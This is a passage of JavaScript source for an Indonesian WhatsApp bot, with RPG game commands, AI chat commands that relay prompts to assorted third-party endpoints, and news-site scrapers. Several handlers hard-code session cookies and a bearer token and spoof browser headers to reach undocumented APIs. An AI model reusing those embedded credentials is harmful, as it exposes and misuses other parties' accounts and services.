} else ReplyRynzz(`Silahkan Menunggu Selama ${timers}, Untuk Menyelesaikan Misi Kembali`)
}
break

case 'maling': {
if (isBan) return Xban()
await xreaction()
if (!isUserRegistered(ckusrjoin)) return ReplyRynzz('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
if (!m.isGroup) return Xgroup()
function msToTime(duration) {
var milliseconds = parseInt((duration % 1000) / 100),
seconds = Math.floor((duration / 1000) % 60),
minutes = Math.floor((duration / (1000 * 60)) % 60),
hours = Math.floor((duration / (1000 * 60 * 60)) % 24)


hours = (hours < 10) ? "0" + hours : hours
minutes = (minutes < 10) ? "0" + minutes : minutes
seconds = (seconds < 10) ? "0" + seconds : seconds

return hours + " jam " + minutes + " menit " + seconds + " detik"
}
const timeout = 604800000

let user = db.data.users[m.sender]
let time = user.lastmaling + 604800000
if (new Date - user.lastmaling< 604800000) return ReplyRynzz(`📮Anda sudah merampok bank\nTunggu selama ⏲️ ${msToTime(time - new Date())} lagi`)
let money = `${Math.floor(Math.random() * 30000)}`.trim()
let exp = `${Math.floor(Math.random() * 999)}`.trim()
let kardus = `${Math.floor(Math.random() * 1000)}`.trim()
user.money += money * 1
user.exp += exp * 1
user.kardus += kardus * 1
user.lastmaling = new Date * 1
ReplyRynzz(`Selamat kamu mendapatkan : \n💰+${money} Money\📦+${kardus} Kardus\n✨+${exp} Exp`)
setTimeout(() => {
ReplyRynzz(`Yuk waktunya Maling lagi 👋…`)
}, timeout)
}
break

case 'mancing': {
if (isBan) return Xban()
await xreaction()
if (!isUserRegistered(ckusrjoin)) return ReplyRynzz('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
if (!m.isGroup) return Xgroup()
function clockString(ms) {
let h = Math.floor(ms / 3600000)
let m = Math.floor(ms / 60000) % 60
let s = Math.floor(ms / 1000) % 60
return [h, m, s].map(v => v.toString().padStart(2, 0) ).join(':')
}
let __timers = (new Date - db.data.users[m.sender].lastmisi)
let _timers = (3600000 - __timers)
let timers = clockString(_timers) 
let name = Alice.getName(m.sender)
let user = db.data.users[m.sender]
let id = m.sender
let kerja = 'Memancing'
Alice.misi = Alice.misi ? Alice.misi : {}
if (id in Alice.misi) {
ReplyRynzz(`Selesaikan Misi ${Alice.misi[id][0]} Terlebih Dahulu`)
throw false
}
if (user.umpan == 0) return ReplyRynzz('Kamu Membutuhkan Umpan 🪱 Untuk Memancing!')
if (user.fishingrod == 0 ) return ReplyRynzz('Kamu Harus Mempunyai Fishingrod 🎣 Terlebih Dahulu Jika Ingin Memancing')
if (new Date - user.lastmisi > 3600000) {
let ikan1 = Math.floor(Math.random() * 5)
let ikan2 = Math.floor(Math.random() * 5)
let ikan3 = Math.floor(Math.random() * 5)
let ikan4 = Math.floor(Math.random() * 5)
let ikan5 = Math.floor(Math.random() * 5)
let ikan6 = Math.floor(Math.random() * 5)
let ikan7 = Math.floor(Math.random() * 5)
let ikan8 = Math.floor(Math.random() * 5)
let ikan9 = Math.floor(Math.random() * 5)
let ikan10 = Math.floor(Math.random() * 5)
let ikan11 = Math.floor(Math.random() * 5)
 
let hsl = ` 
*📮 Hasil tangkapan Mu*
${ikan1 ? `
🦀 Kepiting: ${ikan1}` : ''} ${ikan2 ? `
🦞 Lobster: ${ikan2}` : ''} ${ikan3 ? `
🦐 Udang: ${ikan3}` : ''} ${ikan4 ? `
🦑 Cumi: ${ikan4}` : ''} ${ikan5 ? `
🐙 Gurita: ${ikan5}` : ''} ${ikan6 ? `
🐡 Buntal: ${ikan6}` : ''} ${ikan7 ? `
🐠 Dory: ${ikan7}` : ''} ${ikan8 ? `
🐳 Orca: ${ikan8}` : ''} ${ikan9 ? `
🐬 Lumba: ${ikan9}` : ''} ${ikan10 ? `
🐋 Paus: ${ikan10}` : ''} ${ikan11 ? `
🦈 Hiu: ${ikan11}` : ''}
`.trim()
user.kepiting += ikan1
user.lobster += ikan2
user.udang += ikan3
user.cumi += ikan4
user.gurita += ikan5
user.buntal += ikan6
user.dory += ikan7
user.orca += ikan8
user.lumba += ikan9
user.paus += ikan10
user.hiu += ikan11
user.fishingroddurability -= 10
user.umpan -= 1

Alice.misi[id] = [
kerja,
setTimeout(() => {
delete Alice.misi[id]
}, 20000)
]

setTimeout(() => {
ReplyRynzz(hsl)
}, 20000)

setTimeout(() => {
ReplyRynzz(`Ini Dia Hasil Tangkapanmu`)
}, 18000)

setTimeout(() => {
ReplyRynzz('Kamu Berhasil Menarik Ikan Keluar Dari Air')
}, 15000)

setTimeout(() => {
ReplyRynzz('Kamu Menarik Kailmu')
}, 12000)

setTimeout(() => {
ReplyRynzz('Kail Mu Di Tarik Ikan...')
}, 9000)

setTimeout(() => {
ReplyRynzz('Kamu Sedang Memancing...')
}, 0)
user.lastmisi = new Date * 1
} else ReplyRynzz(`Mohon Tunggu Selama ${timers} Sebelum Memulai Misi Kembali`)
}
break

case 'nguli': {
if (isBan) return Xban()
await xreaction()
if (!isUserRegistered(ckusrjoin)) return ReplyRynzz('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
if (!m.isGroup) return Xgroup()
if (new Date - db.data.users[m.sender].lastnguli > 86400000) {
db.data.users[m.sender].limit += 10
ReplyRynzz('_🎉Selamat kamu mendapatkan +10 limit_')
db.data.users[m.sender].lastnguli = new Date * 1
} else ReplyRynzz('[💬] Anda sudah mengklaim upah nguli hari ini')
}
break

//🌌——————————————————————————————————————————————————————————————————————————🌌\\
// Rpg Fitur Batas!
//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//🌌——————————————————————————————————————————————————————————————————————————🌌\\


//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//————————————————————————//
// AI FITUR
//————————————————————————//
//🌌——————————————————————————————————————————————————————————————————————————🌌\\

case 'writecream': {
if (isBan) return Xban()
await xreaction()
 if (!text) return ReplyRynzz(`Masukkan pertanyaan\nExample : ${XyrooRynzz} kamu psikolog|aku sering gelisah malam hari, kenapa ya?`);

 const [logic, question] = text.split('|').map(v => v.trim());
 if (!logic || !question) return ReplyRynzz(`Format salah\nExample : ${XyrooRynzz} persona|pertanyaan`);
 
 async function writecream(logic, question) {
 const url = "https://8pe3nv3qha.execute-api.us-east-1.amazonaws.com/default/llm_chat";
 const query = [
 { role: "system", content: logic },
 { role: "user", content: question }
 ];
 const params = new URLSearchParams({
 query: JSON.stringify(query),
 link: "writecream.com"
 });

 try {
 const response = await fetch(`${url}?${params.toString()}`);
 const data = await response.json();

 let raw = data.response_content || data.reply || data.result || data.text || '';
 let cleaned = raw
 .replace(/\\n/g, '\n')
 .replace(/\n{2,}/g, '\n\n')
 .replace(/\*\*(.*?)\*\*/g, '*$1*');

 return cleaned.trim();
 } catch (error) {
 return `Gagal mengambil respons: ${error.message}`;
 }
}

 const response = await writecream(logic, question);
 ReplyRynzz(response || 'Tidak ada respons.');
};
break
case 'yupraai': {
if (isBan) return Xban()
await xreaction()
if (!text) return ReplyRynzz(`Gunakan: ${XyrooRynzz} hai`);

 const timestamp = Date.now();
 const sessionId = m.chat;
 const encodedText = encodeURIComponent(text);
 const url = `https://api.yupradev.biz.id/ai/ypai?text=${encodedText}&t=${timestamp}&session=${sessionId}`;

 try {
 const res = await axios.get(url, {
 headers: {
 authority: 'api.yupradev.biz.id',
 accept: '*/*',
 origin: 'https://ai.yupradev.biz.id',
 referer: 'https://ai.yupradev.biz.id/',
 'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
 }
 });

 const data = res.data;
 const replyText = data.response || data.result || JSON.stringify(data);
 await ReplyRynzz(replyText.trim(), m);
 } catch (err) {
 console.error(err);
 await ReplyRynzz('❌ Gagal ke API: ${err.message}');
 }
};
break
case 'feloai': {
if (isBan) return Xban()
await xreaction()
  if (!q) return ReplyRynzz(`Ada apa? Ada yang bisa fello bantu cari?`);
  if (q.length > 1000) return ReplyRynzz(`☘️ *Maksimal 1000 Karakter*`);
  try {

    const licefelo = await Felo(q);
    if (licefelo.error) {
      ReplyRynzz("⚠ *Terjadi Kesalahan*");
      return;
    }

    let answer = licefelo.answer || "Tidak ada jawaban yang ditemukan.";
    let sources = licefelo.source.length > 0
      ? `📑 *Sumber Yang Saya Gunakan*:\n${licefelo.source
          .filter(src => src.link)
          .slice(0, 5)
          .map((src, i) => `_${src.link}_`)
          .join("\n\n")}`
      : "-";

    let messg = `ᴘᴏᴡᴇʀᴇᴅ ᴡɪᴛʜ ғᴇʟᴏᴀɪ\n\n${answer}\n\n${sources}`;

    await Alice.sendMessage(m.chat, { text: messg });
  } catch (error) {
    console.error(error);
    ReplyRynzz("⚠ *Terjadi Kesalahan*");
  }
}
break

case 'aliceai' : {
if (isBan) return Xban()
await xreaction()
  try {
    if (!text) return ReplyRynzz(`Tulis sesuatu setelah perintah ini.\n\nContoh:\n${XyrooRynzz} hai apa kabar?\n${XyrooRynzz} https://vt.tiktok.com/ZSFxYcCdr/\n${XyrooRynzz} buatkan gambar wanita`)

    let regexTikTok = /(https?:\/\/)?(www\.|vm\.|vt\.)?tiktok\.com\/[^\s]+/gi
    let isTikTok = regexTikTok.test(text)
    let isImageReq = /(gambar|buatkan.*gambar|bikin.*gambar|buat.*gambar)/i.test(text)

    if (isTikTok) {
      let link = text.match(regexTikTok)[0]
      let res = await fetch(`https://www.velyn.biz.id/api/downloader/tiktok?url=${encodeURIComponent(link)}`)
      let json = await res.json()

      if (!json?.status || !json?.data?.no_watermark) {
        return ReplyRynzz(`❌ Error\nLogs error : Gagal mengunduh video TikTok.`)
      }

      let prompt = `Buatkan caption menarik untuk video TikTok dengan judul: ${json?.data?.title || 'tanpa judul'}`
      let aiRes = await fetch(`https://www.velyn.biz.id/api/ai/velyn-1.0-1b?prompt=${encodeURIComponent(prompt)}`)
      let aiJson = await aiRes.json()

      if (!aiJson?.status || !aiJson?.result) {
        return ReplyRynzz(`❌ Error\nLogs error : Gagal mendapatkan caption dari AI.`)
      }

      await Alice.sendMessage(m.chat, {
        video: { url: json.data.no_watermark },
        caption: aiJson.result.toString()
      }, { quoted: m })

    } else if (isImageReq) {
      let prompt = text
      let res = await fetch(`https://www.velyn.biz.id/api/ai/text2img?prompt=${encodeURIComponent(prompt)}`)
      if (!res.ok) return ReplyRynzz(`❌ Error\nLogs error : Gagal menghubungi layanan gambar.`)

      let buffer = await res.buffer()
      await Alice.sendMessage(m.chat, {
        image: buffer,
        caption: `Berikut hasil gambar untuk prompt:\n*${prompt}*`
      }, { quoted: m })

    } else {
      let prompt = text
      let res = await fetch(`https://www.velyn.biz.id/api/ai/velyn-1.0-1b?prompt=${encodeURIComponent(prompt)}`)
      let json = await res.json()

      if (!json?.status || !json?.result) {
        throw `❌ Error\nLogs error : Gagal merespons pesan AI.`
      }

      ReplyRynzz(json.result.toString())
    }

  } catch (e) {
    console.error(e)
    return ReplyRynzz(`❌ Error\nLogs error : ${(e?.message || e).toString()}`)
  }
}
break

case 'magicstudio': {
if (isBan) return Xban()
await xreaction()
    if (!args[0]) return ReplyRynzz(`Masukkan prompt untuk gambar!\nExample: ${XyrooRynzz} buatkan gambar wanita sedang memegang botol cocacola sambil menyender di tembok`);
 
    let prompt = encodeURIComponent(args.join(' '));
    let apiUrl = `https://velyn.biz.id/api/ai/magicStudio?prompt=${prompt}&apikey=velyn`;
 
    try {
        let res = await fetch(apiUrl);
        let contentType = res.headers.get('content-type');
 
        console.log('Content-Type:', contentType); 
 
        if (contentType && contentType.startsWith('image')) {
            let buffer = await res.buffer();
            await Alice.sendFile(m.chat, buffer, 'magicStudio.jpg', `Berhasil Membuat Gambar\n${packname}`, xy);
        } else {
            ReplyRynzz('Gagal mendapatkan gambar, API mungkin sedang error.');
        }
    } catch (e) {
        console.error('Fetch Error:', e);
        ReplyRynzz('Terjadi kesalahan saat menghubungi API.');
    }
};
break

case 'gemmaai' : {
if (isBan) return Xban()
await xreaction()
  if (!text) return ReplyRynzz(`nanya apa?\n${XyrooRynzz} Hai gemma`)

  try {
    const res = await fetch(`https://www.velyn.biz.id/api/ai/gemma-2-9b-it?prompt=${encodeURIComponent(text)}`)
    if (res.ok) {
      const json = await res.json()
      if (json.status) {
        await Alice.sendMessage(m.chat, { text: json.data }, { quoted: m })
      } else {
        await Alice.sendMessage(m.chat, { text: 'Gagal mendapatkan data dari API.' }, { quoted: m })
      }
    } else {
      await Alice.sendMessage(m.chat, { text: `Status error: ${res.status}` }, { quoted: m })
    }
  } catch (e) {
    await Alice.sendMessage(m.chat, { text: 'Terjadi kesalahan internal saat memproses permintaan.' }, { quoted: m })
    console.error(e)
  }
}
break
case 'aivelyn':
case 'velynai': {
if (isBan) return Xban()
await xreaction()
  if (!text) return ReplyRynzz('iyaa kak ada apa? ada yang bisa aku bantu?');

  try {
    const url = `https://www.velyn.biz.id/api/ai/velyn-1.0-1b?prompt=${encodeURIComponent(text)}`;
    const response = await fetch(url);

    if (!response.ok) {
      throw new Error(`HTTP error! Status: ${response.status}`);
    }

    const data = await response.json();
    const result = data.result || "Maaf, tidak ada jawaban.";

    return ReplyRynzz(result);
  } catch (error) {
    console.error("Terjadi kesalahan:", error);
    return ReplyRynzz("Maaf, terjadi kesalahan saat menghubungi AI.");
  }
}
break

case 'muslimai': {
if (isBan) return Xban()
await xreaction()
  if (!text) return ReplyRynzz(`Hai, saya ai muslim yang siap membantu anda mencari informasi sekita islami`);

  try {
    const result = await muslimai(text);

    if (result.error) return ReplyRynzz(result.error);

    let sourcesText = result.sources.length > 0 
        ? result.sources.map((src, index) => `${index + 1}. *${src.title}*\n🔗 ${src.url}`).join("\n\n")
        : "Tidak ada sumber yang ditemukan.";

    let responseMessage = `ᴘᴏᴡᴇʀᴇᴅ ᴡɪᴛʜ ᴍᴜsʟɪᴍᴀɪ\n\n${result.answer}`;

    ReplyRynzz(responseMessage);
} catch (error) {
    console.error("⚠ *Error* :", error);
    ReplyRynzz("Terjadi kesalahan.");
}
}
break;

case 'llama-ai':{
if (isBan) return Xban()
await xreaction()
let messages = [];
  try {
 
    if (!text) return ReplyRynzz(`Input textnya?`);
    let response = await fetch(`https://restapii.rioooxdzz.web.id/api/llama?message=${encodeURIComponent(text)}`);
 
    if (!response.ok) {
      throw new Error("Request to OpenAI API failed");
    }
 
    let result = await response.json();
 
    await Alice.sendMessage(m.chat, {
      text: "" + result.data.response,
    });
 
    messages = [...messages, { role: "user", content: text }];
  } catch (error) {
    await Alice.sendMessage(m.chat, {
      text: "" + `Error: ${error.message}`,
    });
  }
}
break

case 'gptturbo':{
if (isBan) return Xban()
await xreaction()
async function gptturbo(query) {
    const apiUrl = `https://restapii.rioooxdzz.web.id/api/gptturbo?message=${encodeURIComponent(query)}`;
 
    try {
        const response = await fetch(apiUrl, {
            method: 'GET',
            headers: {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
            }
        });
        if (!response.ok) {
            throw new Error(`Error: ${response.status}`);
        }
 
        const responseJson = await response.json();
         if (responseJson && responseJson.data.response) {
            return responseJson.data.response;
        } else {
            return "Tidak ada pesan dalam response.";
        }
    } catch (error) {
        console.error("Terjadi kesalahan:", error.message);
        return "Gagal mendapatkan respons dari server.";
    }
}
 
if (!text) return ReplyRynzz(`Contoh:\n${Xyroo}${command} Halo?`);
let gpiti = await gptturbo(text);
let turbo = `Title : ${text}\n\nMessage : ${gpiti}\n`;
await Alice.sendMessage(m.chat, {
    text: "⬣───「 *G P T T U R B O* 」───⬣" + "\n\n" + turbo,
    contextInfo: {
      externalAdReply: {  
        title: "GPT - TURBO",
        body: '',
        thumbnailUrl: "https://pomf2.lain.la/f/jzv6iqu.jpg",
        sourceUrl: null,
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
  }, { quoted: m });
}
break

case 'gemini-ai':{
if (isBan) return Xban()
await xreaction()
async function gemini(query) {
    const apiUrl = `https://restapii.rioooxdzz.web.id/api/bard?message=${encodeURIComponent(query)}`;
    try {
        const response = await fetch(apiUrl, {
            method: 'GET',
            headers: {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
            }
        });
        if (!response.ok) {
            throw new Error(`Error: ${response.status}`);
        }
        const responseJson = await response.json();
        if (responseJson && responseJson.result) {
            return responseJson.result;
        } else {
            return "Tidak ada pesan dalam response.";
        }
    } catch (error) {
        console.error("Terjadi kesalahan:", error.message);
        return "Gagal mendapatkan respons dari server.";
    }
}
if (!text) return ReplyRynzz(`Contoh:\n${Xyroo}${command} Halo?`);
let ouh = await gemini(text);
let gmini = `Title : ${text}\n\nAnswer : ${ouh}\n`;
 
await Alice.sendMessage(m.chat, {
    text: "⬣───「 *G E M I N I* 」───⬣" + "\n\n" + gmini,
    contextInfo: {
      externalAdReply: {  
        title: "Gemini - Asisten",
        body: '',
        thumbnailUrl: "https://pomf2.lain.la/f/rm98p7vp.jpg",
        sourceUrl: null,
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
  }, { quoted: m });
}
break

case 'lumin-ai': {
if (isBan) return Xban()
await xreaction()
  if (!q) return ReplyRynzz(`Ada yang bisa aku bantu?`);
  
  try {
      const aliceeai = await Eai(q);
      if (!aliceeai) {
          return ReplyRynzz("Tidak Ada Respon");
      }
      await ReplyRynzz(`${aliceeai}\n\n${packname}`);
  } catch (error) {
      console.error("Error Saat Mendapatkan Data :", error.message);
      ReplyRynzz("Terjadi Kesalahan Dalam Proses Permintaan.");
  }
}
break

case 'typli-ai': {
if (isBan) return Xban()
await xreaction()
 if (!q) return ReplyRynzz(`_Tanya apa?_`);
 // wm avz
 const avz = async (prompt) => {
   const data = {
     prompt: prompt,
     temperature: 1.2
   };
// wm avz
   const config = {
     method: 'post',
     url: 'https://typli.ai/api/generators/completion',
     headers: {
       'Content-Type': 'application/json',
       'Accept': 'application/json'
     },
     data: JSON.stringify(data)
   };
// wm avz
   try {
     const response = await axios(config);
     return response.data;
   } catch (error) {
     console.error("Fetch error:", error.response ? error.response.data : error.message);
     throw error;
   }
 };
 // wm avz
 const avoskybaik = `${encodeURIComponent(q)}`;
 try {
   const answer = await avz(q);
   ReplyRynzz(answer);
 } catch (error) {
   ReplyRynzz("Terjadi kesalaha!");
 }
}
break;

case 'poly-ai':{
if (isBan) return Xban()
await xreaction()
  if (!q) return ReplyRynzz(`_Tanya apa?_`);
  async function polybuzzAi(prompt) {
  let data = new URLSearchParams();
  data.append('currentChatStyleId', '1');
  data.append('mediaType', '2');
  data.append('needLive2D', '2');
  data.append('secretSceneId', 'wHp7z');
  data.append('selectId', '209837277');
  data.append('speechText', prompt);

  let headers = {
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'Cookie': 'session=9997156d23496b9ff96fc09d162191f74821790eaa4ecc52096273a60f517ad3',
  };

  try {
    let { data: respon } = await axios.post('https://api.polybuzz.ai/api/conversation/msgbystream', data, { headers });
    //dibantu ama ai paling sigma(ChatGpt) kode kemaren yg cvbee.ai
    const result = respon.split('\n')
      .filter(line => line.trim())
      .map(line => {
        try {
          const json = JSON.parse(line.trim());
          return json.content || '';
        } catch (e) {
          console.error("Invalid JSON:", line);
          return '';
        }
      })
      .join('');
      //
    return result;
  } catch (e) {
    console.error(e);
    return null;
  }
}
 try {
   const answer = await polybuzzAi(q);
   ReplyRynzz(answer);
 } catch (error) {
   ReplyRynzz("Terjadi kesalahan !");
 }
}
 break
 

case 'chatevery-where':{
if (isBan) return Xban()
await xreaction()
  if (!text) return ReplyRynzz(`Example: ${XyrooRynzz} axios`)
async function sanzmd(prompt) {
  const response = await axios({
    method: "POST",
    url: "https://chateverywhere.app/api/chat",
    headers: {
      "Content-Type": "application/json",
      "Cookie": "_ga=GA1.1.34196701.1707462626; _ga_ZYMW9SZKVK=GS1.1.1707462625.1.0.1707462625.60.0.0; ph_phc_9n85Ky3ZOEwVZlg68f8bI3jnOJkaV8oVGGJcoKfXyn1_posthog=%7B%22distinct_id%22%3A%225aa4878d-a9b6-40fb-8345-3d686d655483%22%2C%22%24sesid%22%3A%5B1707462733662%2C%22018d8cb4-0217-79f9-99ac-b77f18f82ac8%22%2C1707462623766%5D%7D",
      Origin: "https://chateverywhere.app",
      Referer: "https://chateverywhere.app/id",
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
    },
    data: {
      model: {
        id: "gpt-3.5-turbo-0613",
        name: "GPT-3.5",
        maxLength: 12000,
        tokenLimit: 4000,
      },
      prompt: prompt,
      messages: [{
        pluginId: null,
        content: prompt,
        role: "user"
      },
        {
          pluginId: null,
          content: `${botname} adalah programmer yang berasal dari Sumatera Selatan, Indonesia. Ia adalah seorang yang mengembangkan semua aplikasi.`,
          role: "assistant"
        }]
    }
  })

  return response.data
}
try {
let jut = await sanzmd(text)
ReplyRynzz(`${jut}`)
} catch (error) {
  ReplyRynzz(error.message)
}
}
break

case 'gemini-pro':{
if (isBan) return Xban()
await xreaction()
  if (!text) return ReplyRynzz(`Contoh:\n${XyrooRynzz} Apa itu chatgpt`);

async function fetchWithModel(content, model, token) {
    try {
      const response = await axios.post('https://luminai.my.id/', {
        content,
        model,
        headers: {
                'Authorization': `Bearer ${token}`
                 }
      });

      console.log(response.data);
      return response.data;
    } catch (error) {
      console.error(error);
      throw error;
    }
  }
  fetchWithModel(text, 'gemini-pro', '8be9e34764cd2fc4e6bcfb1bf6a945efe30406573a92d8ef0ec1613dc0e54876')
    .then(data => {
      const textl = data.result;
      ReplyRynzz(textl);
    })
  break;
}
  
case 'gpt-4o':{
if (isBan) return Xban()
await xreaction()
  if (!text) return ReplyRynzz(`Contoh:\n${Xyroo}${command} Apa itu chatgpt`);

  async function fetchWithModel(content, model, token) {
    try {
      const response = await axios.post('https://luminai.my.id/', {
        content,
        model,
        headers: {
                'Authorization': `Bearer ${token}`
                 }
      });

      console.log(response.data);
      return response.data;
    } catch (error) {
      console.error(error);
      throw error;
    }
  }

  fetchWithModel(text, 'gpt-4o', '8be9e34764cd2fc4e6bcfb1bf6a945efe30406573a92d8ef0ec1613dc0e54876')
    .then(data => {
      const textl = data.result;
      ReplyRynzz(textl);
    })
    .catch(error => console.error(error));
  break;
}
 
case 'ai': {
if (isBan) return Xban()
await xreaction()
  if (!text) {
    return ReplyRynzz(`mau tanya apa?`);
  }
  const prompt = `Anda adalah ai, kamu memiliki kecerdasan ai yang luar biasa, kamu senang membantu orang lain, dan gaya bicara mu sangatlah sopan`
  const requestData = { content: text, user: m.sender, prompt: prompt };
  const quoted = m && (m.quoted || xy);

  try {
    let response;
    const mimetype = quoted?.mimetype || quoted?.msg?.mimetype;

    if (mimetype && /image/.test(mimetype)) {
      requestData.imageBuffer = await quoted.download();
    }

    response = (await axios.post('https://luminai.my.id', requestData)).data.result;
    ReplyRynzz(response);
  } catch (err) {
    ReplyRynzz(err.toString());
  }
}
                break
                

//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//————————————————————————//
// Ai Fitur Batas!
//————————————————————————//
//🌌——————————————————————————————————————————————————————————————————————————🌌\\


//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//————————————————————————//
// Berita Fitur
//————————————————————————//
//🌌——————————————————————————————————————————————————————————————————————————🌌\\
case 'metrotv': {
if (isBan) return Xban()
await xreaction()
  try {
    const axios = require('axios')
    const cheerio = require('cheerio')
    const baseURL = 'https://www.metrotvnews.com'
    const { data } = await axios.get(baseURL)
    const $ = cheerio.load(data) 
    const terbaru = []
    const detailList = []
    const links = []
    $('.main-news .big-news-carousel .news-item, .main-news .small-news .news-item').each((i, el) => {
      const title = $(el).find('h1 a, h2 a').text().trim()
      const url = $(el).find('h1 a, h2 a').attr('href')
      const img = $(el).find('img').attr('src') || ''
      const kategori = $(el).find('.news-category').text().trim()
      if (title && url) {
        const fullUrl = url.startsWith('http') ? url : baseURL + url
        terbaru.push({
          title,
          url: fullUrl,
          thumbnail: img.startsWith('http') ? img : baseURL + img,
          kategori
        })
        links.push(fullUrl)
      }
    })
    const url = links[0]
    const detailRes = await axios.get(url)
    const _$ = cheerio.load(detailRes.data)
    let scriptData = ''
    _$('script').each((i, el) => {
      const html = _$(el).html()
      if (html.includes('dimension6')) scriptData = html
    })
    const detail = {
      title: _$('meta[property="og:title"]').attr('content') || '',
      description: _$('meta[property="og:description"]').attr('content') || '',
      image: _$('meta[property="og:image"]').attr('content') || '',
      publishedAt: scriptData.match(/'dimension6':\s*'([^']+)'/)?.[1] || '',
      author: scriptData.match(/'dimension5':\s*'([^']+)'/)?.[1] || '',
      category: scriptData.match(/'dimension7':\s*'([^']+)'/)?.[1] || '',
      content: []
    }
    _$('.news > p').each((i, el) => {
      const text = _$(el).text().trim()
      if (text) detail.content.push(text)
    })
    let teks = `*Berita Terbaru MetroTV*\n\n`
    for (let i = 0; i < terbaru.length; i++) {
      teks += `*${i + 1}. ${terbaru[i].title}*\n`
      teks += `Kategori: ${terbaru[i].kategori}\n`
      teks += `Link: ${terbaru[i].url}\n\n`
    }

    await Alice.sendMessage(m.chat, {
      text: teks,
      contextInfo: {
        externalAdReply: {
          title: "Berita MetroTV",
          body: "Klik untuk baca selengkapnya",
          thumbnailUrl: terbaru[0].thumbnail,
          sourceUrl: terbaru[0].url,
          mediaType: 1,
          renderLargerThumbnail: true
        }
      }
    }, { quoted: m })
    let teksDetail = `*${detail.title}*\n\n`
    teksDetail += `${detail.description}\n\n`
    teksDetail += `Kategori: ${detail.category}\nPenulis: ${detail.author}\nTanggal: ${detail.publishedAt}\n\n`
    teksDetail += detail.content.slice(0, 5).join('\n\n') + '\n\n_Selengkapnya di link berita._'

    await Alice.sendMessage(m.chat, {
      image: { url: detail.image },
      caption: teksDetail
    }, { quoted: m })
  } catch (e) {
    console.error(e)
    ReplyRynzz('Gagal mengambil data dari MetroTV.')
  }
}
break
case 'liputan6': {
if (isBan) return Xban()
await xreaction()
    const axios = require('axios');
    const cheerio = require('cheerio');

    async function avzz() {
        try {
// wm avs                  
            const AvoskyBaik = await axios.get('https://www.liputan6.com/');
            const $ = cheerio.load(AvoskyBaik.data);
// wm avs
            const latestNews = $('.articles--iridescent-list').eq(2).find('article');
// wm avs
            const results = [];
            latestNews.each(function () {
                try {
                    const title = $(this).find('figure a').attr('title');
                    const link = $(this).find('figure a').attr('href');
                    const image = $(this).find('figure a picture img').attr('data-src');
                    const tag = $(this).find('aside header a').text();
// wm avs
                    results.push({ title, link, tag, image, source: 'liputan6' });
                } catch (e) {
// wm avs
                    console.error('Error scraping article:', e);
                }
            });
// wm avs
            return results;
        } catch (error) {
            console.error('Error fetching:', error);
            return [];
        }
    }
// wm avs
    avzz()
        .then(results => {
            if (results.length === 0) {
                ReplyRynzz('Tidak ada berita terbaru yang ditemukan.');
            } else {
                let message = 'Berita Terbaru dari Liputan6:\n\n';
                results.forEach((news, index) => {
                    message += `${index + 1}. ${news.title}\n`;
                    message += `Tag: ${news.tag}\n`;
                    message += `Link: ${news.link}\n`;
                    message += `Gambar: ${news.image}\n\n`;
                });
                ReplyRynzz(message);
            }
        })
        .catch(error => {
            console.error('ada bug:', error.message);
            ReplyRynzz('Terjadi kesalahan...');
        });
}
    break    
    
case 'merdekanews': {
if (isBan) return Xban()
await xreaction()
const fetch = require('node-fetch');
const cheerio = require('cheerio');
async function merdekaavs() {
  try {
    const res = await fetch('https://www.merdeka.com/rss');
    const $ = cheerio.load(await res.text(), { xmlMode: true });
    const channel = {
      title: $('channel > title').text(),
      description: $('channel > description').text(),
      link: $('channel > link').text(),
      image: $('channel > image > url').text(),
    };
    const items = $('item').map((_, el) => ({
      title: 'Title:'+ $(el).find('title').text(),
      link: 'Link:'+ $(el).find('link').text(),
      description: 'Deskripsi:'+ $(el).find('description').text(),
      pubDate: 'Post'+ $(el).find('pubDate').text(),
      image: $(el).find('enclosure').attr('url') || null
    })).get();
    return { channel, total: items.length, data: items };
  } catch {
    return { message: 'Something went wrong' };
  }
}
let lily = await merdekaavs()
      let results = lily.data 
        if (results.length > 0) {
        let message = `Hasil dari pencarian merdeka.com :\n\n`;
        results.forEach((result, index) => {
        message += `${result.title}${result.description}${result.link}\n\n`;
        });
    ReplyRynzz(message)
 } else {
ReplyRynzz('Tidak Ada Hasil.');
}
}
break

case 'malaymail': {
if (isBan) return Xban()
await xreaction()
    ReplyRynzz('_Mencari berita terkini di Malay Mail_');

    try {
        const { data } = await axios.get('https://www.malaymail.com/');
        const $ = cheerio.load(data);

        const newsItems = [];
        $('.article-title a').each((index, element) => {
            const title = $(element).text().trim();
            const link = $(element).attr('href');
            newsItems.push({ title, link });
        });

        if (newsItems.length === 0) {
            throw new Error('Gada Berita Baru');
        }

        let beritaText = 'Berita Terkini dari Malay Mail:\n\n';
        newsItems.forEach((item, index) => {
            beritaText += `${index + 1}. ${item.title}\n`;
            beritaText += `Link: ${item.link}\n\n`;
        });

        ReplyRynzz(beritaText);
    } catch (error) {
        ReplyRynzz(`${error.message}`);
    }
}
break;

case 'vietnamnews': {
if (isBan) return Xban()
await xreaction()
    ReplyRynzz('_Mencari berita terkini di Vietnam News..._'); 
    try {
        const { data } = await axios.get('https://vietnamnews.vn/');
        const $ = cheerio.load(data);
        const newsItems = [];
        $('h3 a').each((index, element) => {
